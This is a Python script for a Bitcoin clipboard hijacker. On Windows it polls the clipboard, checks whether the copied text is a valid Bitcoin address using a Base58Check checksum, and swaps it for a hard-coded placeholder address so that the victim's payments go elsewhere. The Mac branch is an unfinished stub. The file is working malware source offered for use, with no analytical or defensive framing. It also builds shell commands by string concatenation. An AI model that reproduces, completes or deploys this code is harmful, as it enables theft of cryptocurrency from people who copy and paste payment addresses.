from hashlib import sha256
import subprocess
import ctypes
import os
import re

Windows = False
Mac = False
FirstRun = True

CF_TEXT = 1
kernel32 = ctypes.windll.kernel32
kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
kernel32.GlobalLock.restype = ctypes.c_void_p
kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
user32 = ctypes.windll.user32
user32.GetClipboardData.restype = ctypes.c_void_p
digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

#Address that replaces whatever address is originally in clipboard
PASTEBTCADDRESSHERE = "Paste_Btc_Addy"

#These two functions check if the string in the clipboard is an actual BTC Address
def decode_base58(bc, length):
    n = 0
    for char in bc:
        n = n * 58 + digits58.index(char)
    return n.to_bytes(length, 'big')
def check_bc(bc):
    try:
        bcbytes = decode_base58(bc, 25)
        return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
    except Exception:
        return False

#Reads the clipboard (Windows Method)
def get_clipboard_text_Windows():
    user32.OpenClipboard(0)
    try:
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return str(value).split('\'')
    finally:
        user32.CloseClipboard()

#Copies the users BTC Address to clipboard
def copy2clip(txt):
    global Windows,Mac
    if Windows:
        cmd='echo '+txt.strip()+'|clip'
        return subprocess.check_call(cmd, shell=True)
    elif Mac:
        cmd='echo '+txt.strip()+'|pbcopy'
        return subprocess.check_call(cmd, shell=True)
        
#Checks Users operating system
def CheckOS():
    global Windows , Mac , FirstRun
    if FirstRun:
        if os.name == 'nt':
            Windows = True
            Mac = False
        else:
            Mac = True
            Windows = False
    FirstRun = False

#Runs the script
if __name__ == "__main__":
    CheckOS()
    print('Is Mac?:' + str(Mac) + ' Is Windows?:' + str(Windows)) #<Just for Debugging
    if Windows:
        while 1:
            try:
                if check_bc(get_clipboard_text_Windows()[1]):
                    print('string found, replacing with value...')
                    copy2clip(PASTEBTCADDRESSHERE)
                    break
            except:
                continue
    elif Mac:
        print('To Do, Need a MacOS user to help me with this :D')
